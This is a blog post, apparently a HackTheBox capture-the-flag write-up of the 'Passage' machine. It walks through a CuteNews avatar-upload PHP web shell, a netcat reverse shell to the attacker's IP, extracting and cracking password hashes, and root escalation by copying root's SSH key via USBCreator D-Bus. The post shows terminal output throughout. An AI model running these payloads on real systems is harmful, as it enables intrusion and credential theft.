@@ -1,0 +1,711 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Jake W. Ireland's Blog | HackTheBox Write-up &mdash; Passage</title>
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox Write-up &amp;mdash; Passage">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://jakewilliami.github.io//posts/passage-htb">
+  <meta property="og:description" content="">
+  <meta property="og:site_name" content="Jake W. Ireland's Blog">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://jakewilliami.github.io//posts/passage-htb">
+  <meta name="twitter:title" content="HackTheBox Write-up &amp;mdash; Passage">
+  <meta name="twitter:description" content="">
+
+  
+    <meta property="og:image" content="https://jakewilliami.github.io//assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+    <meta name="twitter:image" content="https://jakewilliami.github.io//assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
+  
+
+  <link href="https://jakewilliami.github.io//feed.xml" type="application/rss+xml" rel="alternate" title="Jake W. Ireland's Blog Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-8a826c1e6f10210e502cf6122e9967e86aca67e7c73112953ecb1f7825224740.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-8b247c57e0723af875715bdb5192f71527f76df4a09fcaa3ddf8b565f8b71cc2.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Jake W. Ireland's Blog">Jake W. Ireland's Blog</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox Write-up — Passage</h1>
+            <p></p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    February 24, 2021
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      17 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><em>WARNING: This is my first “hack”; as such, I change tack a couple of times, and it is messy…</em></p>
+
+<p>This machine is currently active, and is my first attempt at HTB.  Its IP address is <code class="highlighter-rouge">10.10.10.206</code>.</p>
+
+<h1 id="the-short-version">The Short Version</h1>
+<ol>
+	<li>Run <code class="highlighter-rouge">nmap -sC -sV 10.10.10.206</code> to get the open ports;</li>
+	<li> Run <code class="highlighter-rouge">echo "10.10.10.206    passage" | sudo tee -a /etc/hosts</code> to get a nicer way to reference the machine;</li>
+	<li>Go to <code class="highlighter-rouge">http://passage:80</code> on your browser.  Notice it uses CuteNews;</li>
+ 	<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/</code> and create an account;</li>
+	<li>Edit your account by uploading an avatar "photo", which is really just a file containing:
+		<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF8;
+		<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="cp">?&gt;</span>
+		</code></pre></div></div>
+	</li>
+	<li>Go to <code class="highlighter-rouge">http://passage:80/CuteNews/uploads/</code>, and click on your recently uploaded PHP file;</li>
+	<li>Run <code class="highlighter-rouge">nc -nlvp 1234</code> in a terminal window;</li>
+	<li>Get the IP address of your <code class="highlighter-rouge">tun0</code> interface: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
+	<li>Append the URL of your upload with <code class="highlighter-rouge">?cmd=nc -e /bin/bash &lt;IP from step 8&gt; 1234</code>;</li>
+	<li>Go back to your terminal and run <code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to gain access to a shell;</li>
+	<li>Now that you have access, you need some passwords.  There are some hashed passwords, encoded using <code class="highlighter-rouge">base64</code>, in the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/</code> directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
+<p><code>
+for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2&gt;/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
+</code></p>
+You could also parse the <code class="highlighter-rouge">/var/www/html/CuteNews/cdata/users/lines</code> file using <code class="highlighter-rouge">while read</code>, as I think that has the same content;</li>
+	<li>You will now need to choose a hash and decode it.  For me, <code class="highlighter-rouge">paul</code>'s hash worked.  I checked <code class="highlighter-rouge">hash-identify</code> to see that it was likely <code class="highlighter-rouge">SHA-256</code>, and thus ran <code class="highlighter-rouge">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz &amp;&amp; hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt &amp;&amp; hashcat --show -m 1400 "$OUR_HASH"</code>: we see the password is <code class="highlighter-rouge">atlanta1</code>.  (Thank you, Paul, for having a terrible password);</li>
+	<li>Login as Paul; <code class="highlighter-rouge">su paul</code>—using the password we found above.  Capture an intermediate flag: <code class="highlighter-rouge">cat ~/user.txt</code>;</li>
+	<li>As Paul seems to have access to admin's (<code class="highlighter-rouge">nadav</code>'s) account via <code class="highlighter-rouge">ssh</code>, we can run <code class="highlighter-rouge">ssh -i ~/.ssh/id_rsa nadav@passage</code>; now we are pretending to be <code class="highlighter-rouge">nadav</code>;</li>
+	<li>Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running <code class="highlighter-rouge">cd /tmp &amp;&amp; gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true &amp;&amp; ssh -i pwn root@passage</code>;</li>
+	<li>Capture the "flag": <code class="highlighter-rouge">cat /root/root.txt</code>.</li>
+</ol>
+
+<h1 id="temp">Temp</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> /var/www/html/CuteNews/cdata/users/<span class="k">*</span>.php<span class="p">;</span> <span class="k">do </span><span class="nv">DECODED</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">tail</span> <span class="nt">-n</span> 1 <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nv">RET_VAL</span><span class="o">=</span><span class="nv">$?</span><span class="p">;</span> <span class="k">if</span> <span class="o">[</span> <span class="nv">$RET_VAL</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then </span><span class="nv">HASH</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'64:'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">';'</span> <span class="s1">'{print $1}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="s2">"</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then </span><span class="nv">NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$DECODED</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"email"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'@'</span> <span class="s1">'{print $1}'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">'"'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="k">${</span><span class="nv">NAME</span><span class="k">}</span><span class="se">\n</span><span class="k">${</span><span class="nv">HASH</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">fi</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<h1 id="the-long-verbatim-version">The Long (Verbatim) Version</h1>
+
+<p>After pinging it, I have run</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.206
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-23 18:37 EST
+Nmap scan report <span class="k">for </span>10.10.10.206
+Host is up <span class="o">(</span>0.70s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Passage News
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>102.67 seconds
+</code></pre></div></div>
+
+<p>From this, we see that port <code class="highlighter-rouge">80</code> is open in http.  I edited <code class="highlighter-rouge">/etc/hosts</code> so that it now looks like this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.206    passage
+
+<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div></div>
+
+<p>You can see where I have added <code class="highlighter-rouge">passage</code>; the machine we are trying to hack.</p>
+
+<p>Now going into the web browser and typing <code class="highlighter-rouge">http://passage:80</code>, we get a website!  Horay!</p>
+
+<p>This page is a news page.  The only news article here that is not in Latin is named</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**Implemented Fail2Ban**
+</code></pre></div></div>
+
+<p>I click on this and this is the body:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Due to unusally large amounts of traffic, we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. View &amp; Comment
+</code></pre></div></div>
+
+<p>There is a comments box.  My very first thought was SQL Injections, but then I was reminded of PHP, so I tried commenting something using PHP.  Nothing happened (though the comment did go through).  Then I tried JavaScript, as one of the comments wrote</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>However, after attempting to write</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Test</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>The page broke, and I had to go back to the main page, at which point both comments previously there were gone.  I cannot recall what the first comment had said.  I have no idea why</p>
+
+<p>I also noted that the admin who posted this has the link to an email address: <code class="highlighter-rouge">nadav@passave.htb</code>.  This might, I think, come in handy with the other open port: <code class="highlighter-rouge">ssh</code>.</p>
+
+<p>I came to a realisation: why can’t I simply google what I want.  I searched <code class="highlighter-rouge">comments section exploit</code> but didn’t find much.  However, after literally searching <code class="highlighter-rouge">cutenews exploit</code> and finding <a href="https://www.exploit-db.com/exploits/10002">this</a>, I tried the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[link=javascript://%0adocument.write('&lt;script&gt;alert(/xss/)&lt;/script&gt;')]funny pictures[/link]
+</code></pre></div></div>
+
+<p>Note: you can allow embedded browsers to run without sandbox for BurpSuite by doing <a href="https://hooya0011.tistory.com/84">Project options &gt; Misc &gt; Embedded Browser &gt; Allow the embedded browser to run without a sandbox</a>.  I was going to use BurpSuite for this task, but I found other avenues, though this will likely come up in the future.</p>
+
+<p>After trying a lot of those exploits, I appended my search with <code class="highlighter-rouge">git</code>, and found <a href="https://github.com/CRFSlick/CVE-2019-11447-POC">this repo</a>, which I cloned.  I then made a CuteNews account for Passage by putting <code class="highlighter-rouge">/CuteNews/</code> before <code class="highlighter-rouge">index.php</code>, and logged into CuteNews using this python script, and uploaded the evil image (<code class="highlighter-rouge">sad.gif</code>).  This gave me a reverse shell, but it wasn’t quite what I wanted; every command I ran gave me a bunch of HTML.  I needed to find a similar exploit, but this one wasn’t working.</p>
+
+<p>I went back to my Google search and found <a href="https://github.com/mt-code/CVE-2019-11447">this</a>.  I ran this, which uploads a php shell file as my avatar.  After that was successful, I must admit I was a little lost: how do I now use this exploit?  I went back to my refined search once again and found <a href="https://raw.githubusercontent.com/musyoka101/CuteNews_2.1.2_RCE_exploit/master/exploit.py">this</a> exploit script, which I then ran and put the URL in, as well as my user credentials, and voila—: a reverse shell!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/testing]
+└─$ python3 exploit.py                                                                                                                                                                             1 ⨯ 2 ⚙
+
+
+
+           _____     __      _  __                     ___   ___  ___
+          / ___/_ __/ /____ / |/ /__ _    _____       |_  | &lt;  / |_  |
+         / /__/ // / __/ -_)    / -_) |/|/ (_-&lt;      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
+                                ___  _________                        
+                               / _ \/ ___/ __/                        
+                              / , _/ /__/ _/                          
+                             /_/|_|\___/___/                          
+                                                                      
+
+                                                                                                                                                   
+
+Enter the URL&gt; http://passage:80
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+================================================================
+
+================================================================
+
+================================================================
+Possible users
+================================================================
+kim@example.com
+paul@passage.htb
+sid@example.com
+nadav@passage.htb
+================================================================
+
+Do You Have a valid credential: [yes] or [no] ==&gt; yes
+
+[*] Please enter the credentials below
+    Username ==&gt; Christopher Tatlock
+    Password ==&gt; W@ci5M%QS^Kr8x3ov7!7
+[+] Login was successfull
+
+================================================================
+Sending Payload
+================================================================
+signature_key: fad251d607c5ac7ebd52ada5f4c48144-Christopher Tatlock
+signature_dsi: 7d4328bd3891236ddce1cb524aeda03b
+logged in user: Christopher Tatlock
+
+============================
+Dropping to a SHELL
+============================
+
+command &gt;
+</code></pre></div></div>
+
+<p>This exploit uploads PHP code as your profile picture.</p>
+
+<p>I ran <code class="highlighter-rouge">ls /home/</code> and saw the users <code class="highlighter-rouge">nadav</code> (that admin we noted earlier) and <code class="highlighter-rouge">paul</code>; neat!  I recall that there is an <code class="highlighter-rouge">ssh</code> port open, so I try to make a user for myself (I have done this before; it is trivial for Linux users).  The only tricky thing is that this shell is very minimal and only has <code class="highlighter-rouge">stdout</code>, I believe.  To get around this, I might show everything as stdout by</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;cmd&gt; 2&gt;&amp;1
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">command</span> <span class="o">&gt;</span> <span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
+paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+</code></pre></div></div>
+
+<p>We see <code class="highlighter-rouge">paul</code> and <code class="highlighter-rouge">nadav</code> down there, as users already, but we do not have access to the password.  We try to add our own user:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">command</span> <span class="o">&gt;</span> <span class="nb">sudo </span>useradd christopher 2&gt;&amp;1
+<span class="nb">sudo</span>: no <span class="nb">tty </span>present and no askpass program specified
+</code></pre></div></div>
+<p>But it does not register our terminal very well (as the shell is minimal/bad).  We change tack: doing some more research I find a command line tool that makes exploiting in general easier.</p>
+
+<hr>
+
+<p>We can check <code class="highlighter-rouge">exploit-db</code> again this time using <code class="highlighter-rouge">searchsploit</code>; a command line tool linked to that, and which makes <em>implementing</em> these exploitx easie.  Here is the output:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- ---------------------------------
+CuteNews - 'page' Local File Inclusion                                                                                                                                   | php/webapps/15208.txt
+CuteNews 0.88 - 'comments.php' Remote File Inclusion                                                                                                                     | php/webapps/22285.txt
+CuteNews 0.88 - 'search.php' Remote File Inclusion                                                                                                                       | php/webapps/22284.txt
+CuteNews 0.88 - 'shownews.php' Remote File Inclusion                                                                                                                     | php/webapps/22283.txt
+CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting                                                                                                                  | php/webapps/24238.txt
+CuteNews 0.88/1.3 - 'example2.php' Cross-Site Scripting                                                                                                                  | php/webapps/24239.txt
+CuteNews 0.88/1.3 - 'show_archives.php' Cross-Site Scripting                                                                                                             | php/webapps/24240.txt
+CuteNews 0.88/1.3.x - 'index.php' Cross-Site Scripting                                                                                                                   | php/webapps/24566.txt
+CuteNews 1.1.1 - 'html.php' Remote Code Execution                                                                                                                        | php/webapps/4851.txt
+CuteNews 1.3 - Comment HTML Injection                                                                                                                                    | php/webapps/24290.txt
+CuteNews 1.3 - Debug Query Information Disclosure                                                                                                                        | php/webapps/23406.txt
+CuteNews 1.3.1 - 'show_archives.php' Cross-Site Scripting                                                                                                                | php/webapps/24372.txt
+CuteNews 1.3.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/29217.txt
+CuteNews 1.4.0 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1221.php
+CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution                                                                                                               | php/webapps/1400.pl
+CuteNews 1.4.1 - 'function.php' Local File Inclusion                                                                                                                     | php/webapps/1612.php
+CuteNews 1.4.1 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/27819.txt
+CuteNews 1.4.1 - 'show_archives.php' Traversal Arbitrary File Access                                                                                                     | php/webapps/26465.txt
+CuteNews 1.4.1 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/27252.txt
+CuteNews 1.4.1 - 'template' Traversal Arbitrary File Access                                                                                                              | php/webapps/26466.txt
+CuteNews 1.4.1 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                           | php/webapps/27740.txt
+CuteNews 1.4.1 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1289.php
+CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                                                                                                                        | php/webapps/29159.txt
+CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/29158.txt
+CuteNews 1.4.5 - Admin Password md5 Hash Fetching                                                                                                                        | php/webapps/4779.php
+CuteNews 1.4.6 - 'from_date_day' Full Path Disclosure                                                                                                                    | php/webapps/33341.txt
+CuteNews 1.4.6 - 'index.php' Cross-Site Request Forgery (New User Creation)                                                                                              | php/webapps/33344.txt
+CuteNews 1.4.6 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/33340.txt
+CuteNews 1.4.6 - 'ip ban' Authorized Cross-Site Scripting / Command Execution                                                                                            | php/webapps/7700.php
+CuteNews 1.4.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/33343.txt
+CuteNews 1.4.6 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/33342.txt
+CuteNews 1.4.6 editnews Module - doeditnews Action Admin Moderation Bypass                                                                                               | php/webapps/33345.txt
+CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                   | php/webapps/37474.txt
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                             | php/remote/46698.rb
+CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                                 | php/webapps/48447.txt
+CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                                     | php/webapps/48458.txt
+CuteNews 2.1.2 - Remote Code Execution                                                                                                                                   | php/webapps/48800.py
+CuteNews aj-fork - 'path' Remote File Inclusion                                                                                                                          | php/webapps/32570.txt
+CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion                                                                                                                 | php/webapps/2891.txt
+CuteNews and UTF-8 CuteNews - Multiple Vulnerabilities                                                                                                                   | php/webapps/10002.txt
+CutePHP CuteNews 1.3 - HTML Injection                                                                                                                                    | php/webapps/22842.txt
+CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection                                                                                                              | php/webapps/25177.txt
+CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/27356.txt
+CutePHP CuteNews 1.4.1 Editnews Module - Cross-Site Scripting                                                                                                            | php/webapps/27676.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results~
+</code></pre></div></div>
+
+<p>We see that there is an avatar remote code execution (RCE), which is always a good bet, so we download the application used to run this exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~]
+└─<span class="nv">$ </span>searchsploit <span class="nt">-m</span> 46698.rb                                                                                                                                                                           2 ⚙
+  Exploit: CuteNews 2.1.2 - <span class="s1">'avatar'</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>
+      URL: https://www.exploit-db.com/exploits/46698
+     Path: /usr/share/exploitdb/exploits/php/remote/46698.rb
+File Type: Ruby script, UTF-8 Unicode text, with CRLF line terminators
+
+Copied to: /home/kali/46698.rb
+</code></pre></div></div>
+
+<p>Now we can use metasploit (<code class="highlighter-rouge">msfconsole</code>) to run this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+
+                                                                                                                           
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                                                                 
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                                                                 
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                                                                 
+     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                                                                    
+          ".@' ; @       @ `.  ;'                                                                                                                                                                          
+            |@@@@ @@@     @    .                                                                                                                                                                           
+             ' @@@ @@   @@    ,                                                                                                                                                                            
+              `.@@@@    @@   .                                                                                                                                                                             
+                ',@@     @   ;           _____________                                                                                                                                                     
+                 (   3 C    )     /|___ / Metasploit! \                                                                                                                                                    
+                 ;@'. __*__,."    \|--- \_____________/                                                                                                                                                    
+                  '(.,...."/                                                                                                                                                                               
+
+
+       =[ metasploit v6.0.15-dev                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View advanced module options with advanced
+
+msf6 &gt;
+</code></pre></div></div>
+
+<p>There are some errors loading this module, which we check by checking the error log:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; cat ~/.msf4/logs/framework.log
+[*] exec: cat ~/.msf4/logs/framework.log
+
